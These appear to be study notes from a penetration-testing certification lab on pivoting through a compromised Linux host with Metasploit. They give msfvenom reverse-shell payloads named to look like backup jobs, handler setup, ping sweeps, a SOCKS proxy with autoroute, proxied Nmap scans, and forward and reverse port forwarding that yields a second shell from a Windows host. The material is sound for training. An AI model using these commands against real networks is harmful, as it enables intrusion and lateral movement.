## Overview

This document outlines how to tunnel and port forward through a compromised pivot host using a Meterpreter session. The focus is on leveraging Metasploit's capabilities for internal network enumeration and shell pivoting without relying on SSH port forwarding.

---

## 1. Creating a Meterpreter Payload for the Pivot Host

**Command (Attack Host):**

```Shell
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 LPORT=8080 -f elf -o backupjob
```

**Outcome:**

Generates a Linux ELF payload named `backupjob` that connects back to the attack host on port 8080.

  

---

## 2. Configuring and Starting the Multi/Handler

**Commands (Metasploit Console):**

```Shell
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 8080
run
```

**Outcome:**

Starts a reverse TCP handler to receive connections from the pivot host.

---

## 3. Executing the Payload on the Pivot Host

**Commands (Pivot Host - Ubuntu):**

- After copying the payload to the Pivot Host

```Shell
chmod +x backupjob
./backupjob
```

**Outcome:**

Establishes a Meterpreter session from the Ubuntu server to the attack host.

---

## 4. Conducting a Ping Sweep

**Option A: Using Metasploit Module**

```Shell
run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

**Option B: Using a Bash One-liner (Linux Pivot):**

```Shell
for i in {1..254}; do (ping -c 1 172.16.5.$i | grep "bytes from" &); done
```

**Option C: CMD One-liner (Windows Pivot):**

```Plain
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

**Option D: PowerShell One-liner:**

```PowerShell
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
```

**Note:**

Ping results may vary due to ARP caching or ICMP firewall restrictions.

---

## 5. Setting Up a SOCKS Proxy for Pivoting

**Commands (Metasploit Console):**

```Shell
bg
use auxiliary/server/socks_proxy
set SRVPORT 9050
set SRVHOST 0.0.0.0
set VERSION 4a
run
```

![[Notion/CPTS/RESOURCES/image 5.png|image 5.png]]

**proxychains.conf Addition requirements:**

```Plain
cat /etc/proxychains.conf

# socks4 127.0.0.1 9050
```

---

## 6. Adding Routes via AutoRoute

Once the SOCKS proxy server has started, attach back to session 1 and then use autoroute to add routes to the 172.16.5.0/16 network:

**Commands (Metasploit Console):**

```Shell
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 172.16.5.0/16
run
```

**Alternative Meterpreter Command:**

```Shell
sessions -i 1
run autoroute -s 172.16.5.0/16
```

![[Notion/CPTS/RESOURCES/image 1 3.png|image 1 3.png]]

**Outcome:**

Routes added to route internal traffic through the Meterpreter session.

---

## 7. Conducting Nmap Scans via Proxychains

Once the route has been added from Pwnbox/PMVPN, enumerate 172.15.5.25 using Nmap through proxychains:

**Command (Attack Host):**

```Shell
proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
```

**Outcome:**

Performs a TCP connect scan routed through the SOCKS proxy.

---

## 8. Port Forwarding Using Meterpreter

Port forwarding can also be accomplished using Meterpreter's portfwd module. We can enable a listener on our attack host and request Meterpreter to forward all the packets received on this port via our Meterpreter session to a remote host on the 172.16.5.0/23 network.

**Local Forwarding Command (Meterpreter):**

```Shell
portfwd add -l 3300 -p 3389 -r 172.16.5.19
```

**Usage (Attack Host):**

```Shell
xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```

**Netstat Verification:**

```Shell
netstat -antp
```

---

## 9. Reverse Port Forwarding

**Meterpreter Command:**

```Shell
portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
```

**Multi/Handler Setup:**

```Shell
set payload windows/x64/meterpreter/reverse_tcp
set LPORT 8081
set LHOST 0.0.0.0
run
```

**Payload Generation (Attack Host):**

```Shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 LPORT=1234 -f exe -o backupscript.exe
```

**Outcome:**

Executes a reverse shell from the Windows host through the Ubuntu pivot to the attack host.

---

  

### 11. Understanding SOCKS Proxy and Proxychains

### SOCKS Proxy Explained

A SOCKS proxy is a general-purpose proxy that establishes a TCP connection to another server on behalf of a client, then routes all traffic between the client and the server. In our case:

- When we run `auxiliary/server/socks_proxy` in Metasploit, it creates a SOCKS proxy server listening on our attack machine (on port 9050).
- This proxy server is configured to route traffic through our established Meterpreter session to the pivot host.
- The SOCKS proxy doesn't interpret or modify the traffic - it simply forwards it through the pivot host to destinations in the internal network.

### Autoroute's Role

The autoroute module tells Metasploit which network traffic should be routed through our Meterpreter session:

- When we add a route with `run autoroute -s 172.16.5.0/16`, we're instructing Metasploit that any traffic destined for the 172.16.5.0/16 network should go through our Meterpreter session.
- This creates the pathway for traffic, but we still need a way to send our local tools' traffic through this pathway.

### How Proxychains Fits In

Proxychains is the missing link that allows our local tools to use the SOCKS proxy:

- Proxychains is a utility that forces any TCP connection made by an application to follow through a proxy (our SOCKS proxy in this case).
- When we modify `/etc/proxychains.conf` to include `socks4 127.0.0.1 9050`, we're telling proxychains to use our local SOCKS proxy.
- When we run `proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn`, proxychains forces Nmap's traffic through our SOCKS proxy.

### The Complete Data Flow

Here's how data flows when using all these components together:

1. You run a command with proxychains (e.g., `proxychains nmap 172.16.5.19`)
2. Proxychains redirects this traffic to your local SOCKS proxy (port 9050)
3. The SOCKS proxy receives the traffic and passes it to Metasploit
4. Metasploit routes the traffic through the Meterpreter session based on the autoroute rules
5. The traffic arrives at the pivot host through the Meterpreter session
6. The pivot host forwards the traffic to its final destination (172.16.5.19)
7. Responses follow the same path in reverse

**Visual Representation:**

Attack Machine → Proxychains → SOCKS Proxy → Metasploit/Meterpreter → Pivot Host → Internal Target

This chain allows you to run tools on your attack machine as if they were running on the pivot host, giving you access to otherwise unreachable networks.

---